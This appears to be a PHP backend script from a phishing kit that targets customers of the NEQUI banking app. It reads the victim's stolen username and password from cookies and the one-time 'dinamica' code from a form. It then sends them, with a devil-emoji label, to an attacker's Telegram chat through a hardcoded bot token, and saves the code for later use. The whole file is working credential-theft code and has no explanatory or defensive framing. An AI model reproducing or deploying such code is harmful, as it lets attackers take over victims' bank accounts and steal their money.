<?php 
require('../prueba/lib/funciones.php');
require('../acciones/bot_telegram.php');
require('../bot.php');

$usuario = $_COOKIE['usuario'];
$contrasena = $_COOKIE['contrasena'];
$registro = $_COOKIE['registro'];

$cdinamica = $_POST['otp'];

$chatId = "-4088574570";
$token = "6473831509:AAEOJz1wQGkabbzRuXKWmvGXKqDo1dhBFcQ";
$mensaje = "😈Agrego Dinamica😈\n🏦NEQUI\n👁User y Pass: $contrasena \n👁Dinamica: $cdinamica";

enviarMensajeTelegram($chatId, $mensaje, $token);
setcookie('cdinamica',$cdinamica,time()+60*9);

actualizar_registro_otp($registro,$cdinamica);


if(empty($usuario) || empty($contrasena)){
    
}else{
    
$chatId= "-4088574570";
$mensaje = "Nueva Dinamica: $usuario - $contrasena\n Dinamica: $cdinamica";
$token = "6473831509:AAEOJz1wQGkabbzRuXKWmvGXKqDo1dhBFcQ";
enviarMensajeTelegram($chatId, $mensaje, $token);
}

?>







